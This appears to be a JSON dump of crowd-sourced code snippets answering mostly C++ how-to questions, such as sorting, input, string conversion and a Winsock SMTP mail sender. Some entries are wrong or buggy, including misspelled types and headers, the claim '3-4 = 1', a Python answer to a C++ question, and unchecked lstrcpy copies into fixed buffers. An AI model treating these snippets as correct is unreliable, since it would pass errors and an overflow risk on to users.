initializeArray(int list[], int listSize) { \tint index; \tfor (index = 0; index < listSize; index++) \t\tlist[index] = 0; }  void printArray(int list[], int listSize) { \tint index; \tfor (index = 0; index < listSize; index++) \t\tcout << list[index] << endl; }    \n",
    "reg_date": "2021-10-12T11:41:16.000Z"
  },
  {
    "id": 2636,
    "keyword": null,
    "link": null,
    "title": " how to send email in c++ program",
    "description": "#define WIN32_LEAN_AND_MEAN  #include <stdio.h> #include <stdlib.h> #include <fstream.h> #include <iostream.h> #include <windows.h> #include <winsock2.h>  #pragma comment(lib, \"ws2_32.lib\")  // Insist on at least Winsock v1.1 const VERSION_MAJOR = 1; const VERSION_MINOR = 1;  #define CRLF \"\\r\\n\"                 // carriage-return/line feed pair  void ShowUsage(void) {   cout << \"Usage: SENDMAIL mailserv to_addr from_addr messagefile\" << endl        << \"Example: SENDMAIL smtp.myisp.com rcvr@elsewhere.com my_id@mydomain.com message.txt\" << endl;    exit(1); }  // Basic error checking for send() and recv() functions void Check(int iStatus, char *szFunction) {   if((iStatus != SOCKET_ERROR) && (iStatus))     return;    cerr << \"Error during call to \" << szFunction << \": \" << iStatus << \" - \" << GetLastError() << endl; }  int main(int argc, char *argv[]) {   int         iProtocolPort        = 0;   char        szSmtpServerName[64] = \"\";   char        szToAddr[64]         = \"\";   char        szFromAddr[64]       = \"\";   char        szBuffer[4096]       = \"\";   char        szLine[255]          = \"\";   char        szMsgLine[255]       = \"\";   SOCKET      hServer;   WSADATA     WSData;   LPHOSTENT   lpHostEntry;   LPSERVENT   lpServEntry;   SOCKADDR_IN SockAddr;    // Check for four command-line args   if(argc != 5)     ShowUsage();    // Load command-line args   lstrcpy(szSmtpServerName, argv[1]);   lstrcpy(szToAddr, argv[2]);   lstrcpy(szFromAddr, argv[3]);    // Create input stream for reading email message file   ifstream MsgFile(argv[4]);    // Attempt to intialize WinSock (1.1 or later)   if(WSAStartup(MAKEWORD(VERSION_MAJOR, VERSION_MINOR), &WSData))   {     cout << \"Cannot find Winsock v\" << VERSION_MAJOR << \".\" << VERSION_MINOR << \" or later!\" << endl;      return 1;   }    // Lookup email server's IP address.   lpHostEntry = gethostbyname(szSmtpServerName);   if(!lpHostEntry)   {     cout << \"Cannot find SMTP mail server \" << szSmtpServerName << endl;      return 1;   }    // Create a TCP/IP socket, no specific protocol   hServer = socket(PF_INET, SOCK_STREAM, 0);   if(hServer == INVALID_SOCKET)   {     cout << \"Cannot open mail server socket\" << endl;      return 1;   }    // Get the mail service port   lpServEntry = getservbyname(\"mail\", 0);    // Use the SMTP default port if no other port is specified   if(!lpServEntry)     iProtocolPort = htons(IPPORT_SMTP);   else     iProtocolPort = lpServEntry->s_port;    // Setup a Socket Address structure   SockAddr.sin_family = AF_INET;   SockAddr.sin_port   = iProtocolPort;   SockAddr.sin_addr   = *((LPIN_ADDR)*lpHostEntry->h_addr_list);    // Connect the Socket   if(connect(hServer, (PSOCKADDR) &SockAddr, sizeof(SockAddr)))   {     cout << \"Error connecting to Server socket\" << endl;      return 1;   }    // Receive initial response from SMTP server   Check(recv(hServer, szBuffer, sizeof(szBuffer), 0), \"recv() Reply\");    // Send HELO server.com   sprintf(szMsgLine, \"HELO %s%s\", szSmtpServerName, CRLF);   Check(send(hServer, szMsgLine, strlen(szMsgLine), 0), \"send() HELO\");   Check(recv(hServer, szBuffer, sizeof(szBuffer), 0), \"recv() HELO\");    // Send MAIL FROM: <sender@mydomain.com>   sprintf(szMsgLine, \"MAIL FROM:<%s>%s\", szFromAddr, CRLF);   Check(send(hServer, szMsgLine, strlen(szMsgLine), 0), \"send() MAIL FROM\");   Check(recv(hServer, szBuffer, sizeof(szBuffer), 0), \"recv() MAIL FROM\");    // Send RCPT TO: <receiver@domain.com>   sprintf(szMsgLine, \"RCPT TO:<%s>%s\", szToAddr, CRLF);   Check(send(hServer, szMsgLine, strlen(szMsgLine), 0), \"send() RCPT TO\");   Check(recv(hServer, szBuffer, sizeof(szBuffer), 0), \"recv() RCPT TO\");    // Send DATA   sprintf(szMsgLine, \"DATA%s\", CRLF);   Check(send(hServer, szMsgLine, strlen(szMsgLine), 0), \"send() DATA\");   Check(recv(hServer, szBuffer, sizeof(szBuffer), 0), \"recv() DATA\");    // Send all lines of message body (using supplied text file)   MsgFile.getline(szLine, sizeof(szLine));             // Get first line    do         // for each line of message text...   {     sprintf(szMsgLine, \"%s%s\", szLine, CRLF);     Check(send(hServer, szMsgLine, strlen(szMsgLine), 0), \"send() message-line\");     MsgFile.getline(szLine, sizeof(szLine)); // get next line.   } while(MsgFile.good());    // Send blank line and a period   sprintf(szMsgLine, \"%s.%s\", CRLF, CRLF);   Check(send(hServer, szMsgLine, strlen(szMsgLine), 0), \"send() end-message\");   Check(recv(hServer, szBuffer, sizeof(szBuffer), 0), \"recv() end-message\");    // Send QUIT   sprintf(szMsgLine, \"QUIT%s\", CRLF);   Check(send(hServer, szMsgLine, strlen(szMsgLine), 0), \"send() QUIT\");   Check(recv(hServer, szBuffer, sizeof(szBuffer), 0), \"recv() QUIT\");    // Report message has been sent   cout << \"Sent \" << argv[4] << \" as email message to \" << szToAddr << endl;    // Close server socket and prepare to exit.   closesocket(hServer);    WSACleanup();    return 0; } \n using System; using System.Net; using System.Net.Mail; using System.Net.Mime; using System.Threading; using System.ComponentModel; namespace Examples.SmtpExamples.Async {     public class SimpleAsynchronousExample     {         static bool mailSent = false;         private static void SendCompletedCallback(object sender, AsyncCompletedEventArgs e)         {             // Get the unique identifier for this asynchronous operation.              String token = (string) e.UserState;              if (e.Cancelled)             {                  Console.WriteLine(\"[{0}] Send canceled.\", token);             }             if (e.Error != null)             {                  Console.WriteLine(\"[{0}] {1}\", token, e.Error.ToString());             } else             {                 Console.WriteLine(\"Message sent.\");             }             mailSent = true;         }         public static void Main(string[] args)         {             // Command-line argument must be the SMTP host.             SmtpClient client = new SmtpClient(args[0]);             // Specify the email sender.             // Create a mailing address that includes a UTF8 character             // in the display name.             MailAddress from = new MailAddress(\"jane@contoso.com\",                \"Jane \" + (char)0xD8+ \" Clayton\",             System.Text.Encoding.UTF8);             // Set destinations for the email message.             MailAddress to = new MailAddress(\"ben@contoso.com\");             // Specify the message content.             MailMessage message = new MailMessage(from, to);             message.Body = \"This is a test email message sent by an application. \";             // Include some non-ASCII characters in body and subject.             string someArrows = new string(new char[] {'\\u2190', '\\u2191', '\\u2192', '\\u2193'});             message.Body += Environment.NewLine + someArrows;             message.BodyEncoding =  System.Text.Encoding.UTF8;             message.Subject = \"test message 1\" + someArrows;             message.SubjectEncoding = System.Text.Encoding.UTF8;             // Set the method that is called back when the send operation ends.             client.SendCompleted += new             SendCompletedEventHandler(SendCompletedCallback);             // The userState can be any object that allows your callback             // method to identify this send operation.             // For this example, the userToken is a string constant.             string userState = \"test message1\";             client.SendAsync(message, userState);             Console.WriteLine(\"Sending message... press c to cancel mail. Press any other key to exit.\");             string answer = Console.ReadLine();             // If the user canceled the send, and mail hasn't been sent yet,             // then cancel the pending operation.             if (answer.StartsWith(\"c\") && mailSent == false)             {                 client.SendAsyncCancel();             }             // Clean up.             message.Dispose();             Console.WriteLine(\"Goodbye.\");         }     } }\n",
    "reg_date": "2021-10-12T11:41:16.000Z"
  },
  {
    "id": 2637,
    "keyword": null,
    "link": null,
    "title": " how to set a range for public int or float unity",
    "description": "using UnityEngine;public class Example : MonoBehaviour {     // This integer will be shown as a slider,     // with the range of 1 to 6 in the Inspector     [Range(1, 6)]     public int integerRange;    // This float will be shown as a slider,     // with the range of 0.2f to 0.8f in the Inspector     [Range(0.2f, 0.8f)]     public float floatRange; } \n",
    "reg_date": "2021-10-12T11:41:16.000Z"
  },
  {
    "id": 2638,
    "keyword": null,
    "link": null,
    "title": " how to set a variable to infinity in c++",
    "description": "#include <limits>  // ...  int a = std::numeric_limits<int>::max(); \n",
    "reg_date": "2021-10-12T11:41:16.000Z"
  },
  {
    "id": 2639,
    "keyword": null,
    "link": null,
    "title": " how to set an integer equal to the largest integer possible in c++",
    "description": "// largest int in c++ signed int iMax = (unsigned int)~0 >> 1; // largest unsigned int unsigned int uMax = (unsigned int)~0;\n2147483647   unsigned long long int = 18 446 744 073 709 551 615\n",
    "reg_date": "2021-10-12T11:41:16.000Z"
  },
  {
    "id": 2640,
    "keyword": null,
    "link": null,
    "title": " how to set arrays as function parameters in c++",
    "description": "void myFunction(int param[]) {    .    .    . } \nvoid myFunction(int param[10]) {    .    .    . } \nvoid myFunction(int *param) {    .    .    . } \n",
    "reg_date": "2021-10-12T11:41:16.000Z"
  },
  {
    "id": 2641,
    "keyword": null,
    "link": null,
    "title": " how to setup glut main loop",
    "description": "It calls your display callback over and over,  calling idle between so that it can maintain a specific framerate if possible,  and others if necessary (such as if you resize the window or trigger an input event). Essentially, within this function is the main program loop, where GLUT does most of the work for you and allows you to simply set up the specific program logic in these callbacks. In your display callback should obviously be your main logic to draw whatever it is that should be going on. In the idle callback should be some very lightweight operations to determine what the change in state should be from the last time display was called to the next time.  For example, if you're animating something, this would be where you change its position or orientation.\n",
    "reg_date": "2021-10-12T11:41:16.000Z"
  },
  {
    "id": 2642,
    "keyword": null,
    "link": null,
    "title": " how to show c++ binary files in sublime text",
    "description": "// folder_exclude_patterns and file_exclude_patterns control which files // are listed in folders on the side bar. These can also be set on a per- // project basis. \"folder_exclude_patterns\": [\".svn\", \".git\", \".hg\", \"CVS\"], \"file_exclude_patterns\": [\"*.pyc\", \"*.pyo\", \"*.exe\", \"*.dll\", \"*.obj\",\"*.o\", \"*.a\", \"*.lib\", \"*.so\", \"*.dylib\", \"*.ncb\", \"*.sdf\", \"*.suo\", \"*.pdb\", \"*.idb\", \".DS_Store\", \"*.class\", \"*.psd\", \"*.db\", \"*.sublime-workspace\"],  // These files will still show up in the side bar, but won't be included in // Goto Anything or Find in Files \"binary_file_patterns\": [\"*.jpg\", \"*.jpeg\", \"*.png\", \"*.gif\", \"*.ttf\", \"*.tga\", \"*.dds\", \"*.ico\", \"*.eot\", \"*.pdf\", \"*.swf\", \"*.jar\", \"*.zip\"],\n",
    "reg_date": "2021-10-12T11:41:17.000Z"
  },
  {
    "id": 2643,
    "keyword": null,
    "link": null,
    "title": " how to show constellations in starry night orion special edition",
    "description": "Press K to toggle constellations on or off.\n",
    "reg_date": "2021-10-12T11:41:17.000Z"
  },
  {
    "id": 2644,
    "keyword": null,
    "link": null,
    "title": " how to sort a string in c++",
    "description": "#include<bits/stdc++.h> using namespace std; int main() { \tsrting str; // First, declare a string.   \tsort(str.begin() , str.end()); // Then sort it by using this method. It is much more convenient.   \tcout << str << endl; // Last of all, print out the string. } \n",
    "reg_date": "2021-10-12T11:41:17.000Z"
  },
  {
    "id": 2645,
    "keyword": null,
    "link": null,
    "title": " how to sort a vector",
    "description": "sort(v.begin(), v.end()); \n// C++ program to sort a vector in non-decreasing  // order.  #include <bits/stdc++.h> // Vector  #include <algorithm>  // Sort using namespace std;     int main()  {  // Initalizing the vector v with these values     vector<int> v{ 1, 5, 8, 9, 6, 7, 3, 4, 2, 0 };  // Vector is sorted in ascending order        sort(v.begin(), v.end());         return 0;  } \nsort(begin(v), end(v), [] (int a, int b) { return a > b; }); // decrease\nsort(a.begin(), a.end());\nvector<int> v; sort(v.begin(),v.end());\n",
    "reg_date": "2021-10-12T11:41:17.000Z"
  },
  {
    "id": 2646,
    "keyword": null,
    "link": null,
    "title": " how to sort a vector in reverse c++",
    "description": "#include <bits/stdc++.h> // Vector #include <algorithm>  // Reverse  using namespace std;  int main() {     vector<int> nums{4,1,2,1,2};      reverse(nums.begin(), nums.end());     return 0; } \n#include <iostream> #include <vector> #include <algorithm> using namespace std; int main() {    vector<int> v = { 10, 9, 8, 6, 7, 2, 5, 1 };    sort(v.begin(), v.end(), greater <>()); }\n",
    "reg_date": "2021-10-12T11:41:17.000Z"
  },
  {
    "id": 2647,
    "keyword": null,
    "link": null,
    "title": " how to sort an array in c++",
    "description": "// C++ program to demonstrate default behaviour of  // sort() in STL.  #include <bits/stdc++.h>  using namespace std;     int main()  {      int arr[] = {1, 5, 8, 9, 6, 7, 3, 4, 2, 0};      int n = sizeof(arr)/sizeof(arr[0]);         sort(arr, arr+n);         cout << \"\\nArray after sorting using \"          \"default sort is : \\n\";      for (int i = 0; i < n; ++i)          cout << arr[i] << \" \";         return 0;  } \n#include <bits/stdc++.h>  using namespace std;   #define size(arr) sizeof(arr)/sizeof(arr[0]);   int main(){      int a[5] = {5, 2, 6,3 ,5};     int n = size(a);     sort((a), a + n);     for(int i = 0; i < n; i++){         cout << a[i];     }       return 0;  } \n#include <iostream> using namespace std;  #define MAX 100  int main() { \t//array declaration \tint arr[MAX]; \tint n,i,j; \tint temp; \t \t//read total number of elements to read \tcout<<\"Enter total number of elements to read: \"; \tcin>>n; \t \t//check bound \tif(n<0 || n>MAX) \t{ \t\tcout<<\"Input valid range!!!\"<<endl; \t\treturn -1; \t} \t \t//read n elements \tfor(i=0;i<n;i++) \t{ \t\tcout<<\"Enter element [\"<<i+1<<\"] \"; \t\tcin>>arr[i]; \t} \t \t//print input elements \tcout<<\"Unsorted Array elements:\"<<endl; \tfor(i=0;i<n;i++) \t\tcout<<arr[i]<<\"\\t\"; \tcout<<endl; \t \t//sorting - ASCENDING ORDER \tfor(i=0;i<n;i++) \t{\t\t \t\tfor(j=i+1;j<n;j++) \t\t{ \t\t\tif(arr[i]>arr[j]) \t\t\t{ \t\t\t\ttemp  =arr[i]; \t\t\t\tarr[i]=arr[j]; \t\t\t\tarr[j]=temp; \t\t\t} \t\t} \t} \t \t//print sorted array elements \tcout<<\"Sorted (Ascending Order) Array elements:\"<<endl; \tfor(i=0;i<n;i++) \t\tcout<<arr[i]<<\"\\t\"; \tcout<<endl;\t \t \t \treturn 0; \t } \n#include <algorithm> #include <iostream> #include <array> using namespace std;  int main() {     array<int, 5> arraysort{ 4,2,3,5,1 };     sort(arraysort.begin(), arraysort.end());     for (int i = 0; i < arraysort.size(); i++) {         cout << arraysort[i] << \" \";     } \treturn 0;  }\n#include <iostream> 2 #include <array> 3 #include <string> 4 #include <algorithm> 5 6 using namespace std; 7 8 int main(){ 9 array<string, 4> colours = {\"blue\", \"black\", \"red\", \"green\"}; 10 for (string colour : colours){ 11 cout << colour << ' '; 12 } 13 cout << endl; 14 sort(colours.begin(), colours.end()); 15 for (string colour : colours){ 16 cout << colour << ' '; 17 } 18 return 0; 19 } 66 20 21 /* 22 Output: 23 blue black red green 24 black blue green red 25 */\n#include <iostream> using namespace std; int main () {    int n,i,j,temp;   cout << \"how many Arrays you wanna sort? \";   cin >> n;   cout << endl << endl;   int a[n];   for(i = 0;i < n; i++){     cout << \"please enter your \" << i + 1 << \" array : \";     cin >> a[i];   }   for(i = 0; i < n; i++){    for(j = 0; j < n - 1; j++){     if( a[j] > a[j+1]){      temp = a[j];       a[j] = a[j+1];         a[j+1] = temp;     }    }   }    cout << \"\\nArray after sorting using default sort is : \\n\";     for (i = 0; i < n; i++)       cout << a[i] << '\\t';   return 0; }\n",
    "reg_date": "2021-10-12T11:41:17.000Z"
  },
  {
    "id": 2648,
    "keyword": null,
    "link": null,
    "title": " how to sort array in c++",
    "description": " // STL IN C++ FOR SORING #include <bits/stdc++.h>  #include <iostream>  using namespace std;  int main()  {      int arr[] = {1, 5, 8, 9, 6, 7, 3, 4, 2, 0};      int n = sizeof(arr)/sizeof(arr[0]);      sort(arr, arr+n);  // ASCENDING SORT     reverse(arr,arr+n);   //REVERESE ARRAY      sort(arr, arr + n, greater<int>());// DESCENDING SORT   } \n// C++ program to demonstrate default behaviour of  // sort() in STL.  #include <bits/stdc++.h>  using namespace std;     int main()  {      int arr[] = {1, 5, 8, 9, 6, 7, 3, 4, 2, 0};      int n = sizeof(arr)/sizeof(arr[0]);         sort(arr, arr+n);         cout << \"\\nArray after sorting using \"          \"default sort is : \\n\";      for (int i = 0; i < n; ++i)          cout << arr[i] << \" \";         return 0;  } \n#include <bits/stdc++.h>  using namespace std;   #define size(arr) sizeof(arr)/sizeof(arr[0]);   int main(){      int a[5] = {5, 2, 6,3 ,5};     int n = size(a);     sort((a), a + n);     for(int i = 0; i < n; i++){         cout << a[i];     }       return 0;  } \n#include <iostream> using namespace std;  #define MAX 100  int main() { \t//array declaration \tint arr[MAX]; \tint n,i,j; \tint temp; \t \t//read total number of elements to read \tcout<<\"Enter total number of elements to read: \"; \tcin>>n; \t \t//check bound \tif(n<0 || n>MAX) \t{ \t\tcout<<\"Input valid range!!!\"<<endl; \t\treturn -1; \t} \t \t//read n elements \tfor(i=0;i<n;i++) \t{ \t\tcout<<\"Enter element [\"<<i+1<<\"] \"; \t\tcin>>arr[i]; \t} \t \t//print input elements \tcout<<\"Unsorted Array elements:\"<<endl; \tfor(i=0;i<n;i++) \t\tcout<<arr[i]<<\"\\t\"; \tcout<<endl; \t \t//sorting - ASCENDING ORDER \tfor(i=0;i<n;i++) \t{\t\t \t\tfor(j=i+1;j<n;j++) \t\t{ \t\t\tif(arr[i]>arr[j]) \t\t\t{ \t\t\t\ttemp  =arr[i]; \t\t\t\tarr[i]=arr[j]; \t\t\t\tarr[j]=temp; \t\t\t} \t\t} \t} \t \t//print sorted array elements \tcout<<\"Sorted (Ascending Order) Array elements:\"<<endl; \tfor(i=0;i<n;i++) \t\tcout<<arr[i]<<\"\\t\"; \tcout<<endl;\t \t \t \treturn 0; \t } \nsort(arr, arr+length); //increase sort(arr, arr+length, greater<int>()); //decrease \n#include <iostream> using namespace std; int main () {    int n,i,j,temp;   cout << \"how many Arrays you wanna sort? \";   cin >> n;   cout << endl << endl;   int a[n];   for(i = 0;i < n; i++){     cout << \"please enter your \" << i + 1 << \" array : \";     cin >> a[i];   }   for(i = 0; i < n; i++){    for(j = 0; j < n - 1; j++){     if( a[j] > a[j+1]){      temp = a[j];       a[j] = a[j+1];         a[j+1] = temp;     }    }   }    cout << \"\\nArray after sorting using default sort is : \\n\";     for (i = 0; i < n; i++)       cout << a[i] << '\\t';   return 0; }\n",
    "reg_date": "2021-10-12T11:41:17.000Z"
  },
  {
    "id": 2649,
    "keyword": null,
    "link": null,
    "title": " how to sort in descending order c++",
    "description": "int arr[10]; int length = sizeof(arr)/sizeof(arr[0]);  sort(arr, arr+length, greater<int>());\n",
    "reg_date": "2021-10-12T11:41:17.000Z"
  },
  {
    "id": 2650,
    "keyword": null,
    "link": null,
    "title": " how to sort in descending order in c++",
    "description": "int arr[10]; int length = sizeof(arr)/sizeof(arr[0]);  sort(arr, arr+length, greater<int>());\nsort(str.begin(), str.end(), greater<int>()); cout<<str;\n",
    "reg_date": "2021-10-12T11:41:17.000Z"
  },
  {
    "id": 2651,
    "keyword": null,
    "link": null,
    "title": " how to sort string containing numbers in c++",
    "description": "#include <iostream> #include <bits/stdc++.h>  #include<string> using namespace std;  int main() {    string s=\"4321\";    int a[s.length()];   for(int i=0;i<s.length();i++){     a[i]=s[i]-48;    }   sort(a,a+s.length()); for(int i=0;i<s.length();i++){     cout<<a[i];    }     return 0; } \n",
    "reg_date": "2021-10-12T11:41:18.000Z"
  },
  {
    "id": 2652,
    "keyword": null,
    "link": null,
    "title": " how to specify how many decimal to print out with std::cout",
    "description": "#include <iostream> #include <iomanip>  int main() {     double d = 122.345;     std::cout << std::fixed << std::setprecision(2) << d; }  //result that get print out: 122.34\n",
    "reg_date": "2021-10-12T11:41:18.000Z"
  },
  {
    "id": 2653,
    "keyword": null,
    "link": null,
    "title": " how to speed up cin and cout",
    "description": "#include <bits/bstdc++.h> using namespace std;  int main(){   // speeding up cin & cout   ios::sync_with_stdio(0); \tcin.tie(0); \tcout.tie(0); //rest of your code   return 0; }\n",
    "reg_date": "2021-10-12T11:41:18.000Z"
  },
  {
    "id": 2654,
    "keyword": null,
    "link": null,
    "title": " how to store a struct in vector in c++",
    "description": "struct subject {   string name;   int marks;   int credits; };   vector<subject> sub; \n",
    "reg_date": "2021-10-12T11:41:18.000Z"
  },
  {
    "id": 2655,
    "keyword": null,
    "link": null,
    "title": " how to store array of string with spaces in c++ stl",
    "description": "#include <iostream> #include <string>  using namespace std;  int main() { string input; getline(cin, input);  cout << \"You entered: \" << input << endl; } \n",
    "reg_date": "2021-10-12T11:41:18.000Z"
  },
  {
    "id": 2656,
    "keyword": null,
    "link": null,
    "title": " how to store pair in min heap in c++",
    "description": "typedef pair<int, int> pi; priority_queue<pi, vector<pi>, greater<pi> > pq;\n",
    "reg_date": "2021-10-12T11:41:18.000Z"
  },
  {
    "id": 2657,
    "keyword": null,
    "link": null,
    "title": " how to string to integer in c++",
    "description": "#include <iostream> #include <string>  int main() {      std::string str = \"123\";     int num;      // using stoi() to store the value of str1 to x     num = std::stoi(str);      std::cout << num;      return 0; }\n// For C++11 and later versions string str1 = \"45\";  string str2 = \"3.14159\";  string str3 = \"31337 geek\";   int myint1 = stoi(str1);  int myint2 = stoi(str2);  int myint3 = stoi(str3);   // Output stoi(\"45\") is 45 stoi(\"3.14159\") is 3 stoi(\"31337 geek\") is 31337 \n#include<string> string str1 = \"45\";  string str2 = \"3.14159\";  string str3 = \"31337 geek\";  int myint1 = stoi(str1); std::cout<<stoi(str1);\n// EXAMPLE std::string sStringAsString = \"789\"; int iStringAsInt = atoi( sStringAsString.c_str() );  /* SYNTAX atoi( <your-string>.c_str() ) */  /* HEADERS #include <cstring> #include <string> */\n",
    "reg_date": "2021-10-12T11:41:18.000Z"
  },
  {
    "id": 2658,
    "keyword": null,
    "link": null,
    "title": " how to substract to give a positive outcome in c++",
    "description": "3-4 = 1\n",
    "reg_date": "2021-10-12T11:41:18.000Z"
  },
  {
    "id": 2659,
    "keyword": null,
    "link": null,
    "title": " how to substract two numbers to give positive outcome in c++ by the hep of pointers",
    "description": "#include <cstdio> #include <cstdlib>  void update(int *a,int *b) {     int temp = *a;     *a = *a + *b;     *b = abs(temp - *b);  }  int main() {     int a, b;     int *pa = &a, *pb = &b;          scanf(\"%d %d\", &a, &b);     update(pa, pb);     printf(\"%d\\n%d\", a, b);      return 0; }\n",
    "reg_date": "2021-10-12T11:41:18.000Z"
  },
  {
    "id": 2660,
    "keyword": null,
    "link": null,
    "title": " how to sum all numbers under a given number c++",
    "description": "int x, s = 0;    cout << \"Enter the number : \";    cin >> x;    while (x != 0) {       s = s + x % 10;       x = x / 10;    }\n// Method 1: Mathematical -> Sum up numbers from 1 to n  int sum(int n){ \treturn (n * (n+1)) / 2; }  // Method 2: Using a for-loop  -> Sum up numbers from 1 to n  int sum(int n){ \tint tempSum = 0;    \tfor (int i = n; i > 0; i--){      \ttempSum += i;       }   \treturn tempSum;  }  // Method 3: Using recursion -> Sum up numbers from 1 to n  int sum(int n){ \treturn n > 0 ? n + sum(n-1) : 0;  }\n// Method 1: Mathematical -> Sum up numbers from 1 to n  int sum(int n){ \treturn (n * (n+1)) / 2; }  // Method 2: Using a for-loop -> Sum up numbers from 1 to n  int sum(int n){ \tint tempSum = 0;    \tfor (int i = n; i > 0; i--){      \ttempSum += i;       }   \treturn tempSum;  }  // Method 3: Using recursion -> Sum up numbers from 1 to n  int sum(int n){ \treturn n > 0 ? n + sum(n-1) : 0;  }\n#include <iostream> #include <math.h> // \"#include <math.h> isn't needed. using namespace std; /* run this program using the console pauser or add your own getch, system(\"pause\") or input loop */  int main(int argc, char** argv) { \t// Sum of numbers in a group under a given number. \tcout << \"Insert four numbers:\" << endl; \t// In this case the numbers I chose to use are four but you can use how many you want. \tfloat a, b, c, d; \tcin >> a >> b >> c >> d; \tfloat aa, bb, cc, dd; \t// The second set of variables must have the same number of variables of the numbers \t// you want to sum. \tif(a < 8){ \t// In this case \"n\" is replaced by 8, but, again, you can use any number you prefer. \t\taa = a; \t\tif(b < 8){ \t\t\tbb = b; \t\t\tif(c < 8){ \t\t\t\tcc = c; \t\t\t\tif(d < 8){ \t\t\t\t\tdd = d; \t\t\t\t} else { \t\t\t\t\tdd = 0; \t\t\t\t} \t\t\t} else { \t\t\t\tcc = 0; \t\t\t\tif(d < 8){ \t\t\t\t\tdd = d; \t\t\t\t} else { \t\t\t\t\tdd = 0; \t\t\t\t} \t\t\t} \t\t} else { \t\t\tbb = 0; \t\t\tif(c < 8){ \t\t\t\tcc = c; \t\t\t\tif(d < 8){ \t\t\t\t\tdd = d; \t\t\t\t} else { \t\t\t\t\tdd = 0; \t\t\t\t} \t\t\t} else { \t\t\t\tcc = 0; \t\t\t\tif(d < 8){ \t\t\t\t\tdd = d; \t\t\t\t} else { \t\t\t\t\tdd = 0; \t\t\t\t} \t\t\t} \t\t} \t} else { \t\taa = 0; \t\tif(b < 8){ \t\t\tbb = b; \t\t\tif(c < 8){ \t\t\t\tcc = c; \t\t\t\tif(d < 8){ \t\t\t\t\tdd = d; \t\t\t\t} else { \t\t\t\t\tdd = 0; \t\t\t\t} \t\t\t} else { \t\t\t\tcc = 0; \t\t\t\tif(d < 8){ \t\t\t\t\tdd = d; \t\t\t\t} else { \t\t\t\t\tdd = 0; \t\t\t\t} \t\t\t} \t\t} else { \t\t\tbb = 0; \t\t\tif(c < 8){ \t\t\t\tcc = c; \t\t\t\tif(d < 8){ \t\t\t\t\tdd = d; \t\t\t\t} else { \t\t\t\t\tdd = 0; \t\t\t\t} \t\t\t} else { \t\t\t\tcc = 0; \t\t\t\tif(d < 8){ \t\t\t\t\tdd = d; \t\t\t\t} else { \t\t\t\t\tdd = 0; \t\t\t\t} \t\t\t} \t\t} \t} \tcout << endl << \"Sum of the numbers lower than n (8): \" << aa+bb+cc+dd << endl; \t// Basically this associates each number to a variable of the second group and \t// then, through if, it sees which numbers are under n. \t// If they are under n the second variable is given the same numeric value as \t// its respective number, if not its value is equal to 0. \t// It then sums the variables together. \t// To have more/less numbers you add the respective variables, then make two \t// cases where the number is higher or lower than n. Then, you copy-paste \t// the two if chains underneath. \treturn 0; }\n",
    "reg_date": "2021-10-12T11:41:19.000Z"
  },
  {
    "id": 2661,
    "keyword": null,
    "link": null,
    "title": " how to switch to another branch in git",
    "description": "$ git checkout <existing_branch>  $ git checkout -b <new_branch>\ngit checkout 'another_branch' \ngit checkout <name> \n$ git branch iss53 $ git checkout iss53\nGithub branch  pull request in branch\n$ git branch\n",
    "reg_date": "2021-10-12T11:41:19.000Z"
  },
  {
    "id": 2662,
    "keyword": null,
    "link": null,
    "title": " how to take continuous input in c++ until any value. Like for example(taking input until giving q)",
    "description": "summ = 0 count = 1 while raw_input(\"Enter q to quit or any other key to continue\") != 'q':     summ = summ+input()     count=count+1 print summ/(count*1.0) \n",
    "reg_date": "2021-10-12T11:41:19.000Z"
  },
  {
    "id": 2663,
    "keyword": null,
    "link": null,
    "title": " how to take full sentence in c++",
    "description": "#include<bits/stdc++.h> using namespace std; int main(){     string input;     getline(cin,input);     cout<<input<<endl;  } \n",
    "reg_date": "2021-10-12T11:41:19.000Z"
  },
  {
    "id": 2664,
    "keyword": null,
    "link": null,
    "title": " how to take input in 2d vector in c++",
    "description": "myVector[   Vector[0, 4, 2, 5],   Vector[1, 4, 2] ];  /*When you call for myVector[1].size() it would return 3 and [0] would return 4.  For the amount of rows (int vectors) in the 2d vector, you can just use myVector.size()  You can run this to see it in actions*/\n// Initializing 2D vector \"vect\" with  // values  vector<vector<int> > vect{ { 1, 2, 3 },                             { 4, 5, 6 },                             { 7, 8, 9 } }; \nstd::vector<vector<int>> d; //std::vector<int> d; cout<<\"Enter the N number of ship and port:\"<<endl; cin>>in; cout<<\"\\Enter preference etc..:\\n\"; for(i=0; i<in; i++){  cout<<\"ship\"<<i+1<<\":\"<<' ';     for(j=0; j<in; j++){     cin>>temp;     d[i].push_back(temp);      } }\nvector<vector<int> > d; int val; for(int i = 0; i < in; i++){     vector<int> temp;     for(int j = 0; j < in; j++){         cin >> val;         temp.push_back(val);     }     d.push_back(temp);     temp.clear(); } From SpyrosD3v25\nvector<vector<int> > d; int val; for(int i = 0; i < in; i++){     vector<int> temp;     for(int j = 0; j < in; j++){         cin >> val;         temp.push_back(val);     }     d.push_back(temp);     temp.clear(); } \nstd::vector<vector<int>> d; //std::vector<int> d; cout<<\"Enter the N number of ship and port:\"<<endl; cin>>in; cout<<\"\\Enter preference etc..:\\n\"; for(i=0; i<in; i++){  cout<<\"ship\"<<i+1<<\":\"<<' ';     for(j=0; j<in; j++){     cin>>temp;     d.push_back(temp);// I don't know how to push_back here!!     } }\n",
    "reg_date": "2021-10-12T11:41:19.000Z"
  },
  {
    "id": 2665,
    "keyword": null,
    "link": null,
    "title": " how to take multiple input from user in c++",
    "description": "int a , b; cin >> a >> b;\n",
    "reg_date": "2021-10-12T11:41:19.000Z"
  },
  {
    "id": 2666,
    "keyword": null,
    "link": null,
    "title": " how to take space separated input in c++",
    "description": "string z,s;  while (true)     {       cin>>z;       s+=z;       if(cin.peek()=='\\n')       break;     } ................................ \t        OR\\/ ................................. string s; getline(cin,s);\nint main() { int sum = 0; cout << \"enter number\" << endl; int i = 0; while (true) {     cin >> i;     sum += i;     //cout << i << endl;     if (cin.peek() == '\\n') {         break;     }      }  cout << \"result: \" << sum << endl; return 0; } \nint i, n, arr[100];  scanf(\"%d\", &n); for (i = 0; i < n; ++i)     scanf(\"%d\", &arr[i]); \n",
    "reg_date": "2021-10-12T11:41:20.000Z"
  },
  {
    "id": 2667,
    "keyword": null,
    "link": null,
    "title": " how to take unknown no of input in cpp",
    "description": "#include<iostream> #include<vector> using namespace std; int main() {     int x;     vector<int> v;     while(cin>>x)     {         v.push_back(x);     }     for (int i = 0; i < v.size(); i++)         cout << v[i] << \" \";     return 0; }\n",
    "reg_date": "2021-10-12T11:41:20.000Z"
  },
  {
    "id": 2668,
    "keyword": null,
    "link": null,
    "title": " how to take user input in a client server program in c++",
